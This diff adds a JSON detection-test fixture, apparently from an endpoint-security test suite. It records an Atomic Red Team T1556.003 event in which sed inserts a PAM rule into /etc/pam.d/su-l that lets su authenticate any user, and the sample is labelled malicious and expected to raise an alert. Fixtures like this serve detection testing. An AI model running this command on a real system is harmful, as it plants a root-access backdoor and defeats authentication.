@@ -1,0 +1,11 @@
+{
+  "label": "malicious",
+  "source": "Atomic Red Team T1556.003 Malicious PAM rule (sed -i into /etc/pam.d/su-l)",
+  "event_simpleName": "ProcessRollup2",
+  "event_platform": "Lin",
+  "ImageFileName": "/usr/bin/sed",
+  "ParentBaseFileName": "bash",
+  "CommandLine": "sed -i \"1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su-l",
+  "expect_alert": true,
+  "result": "not run"
+}
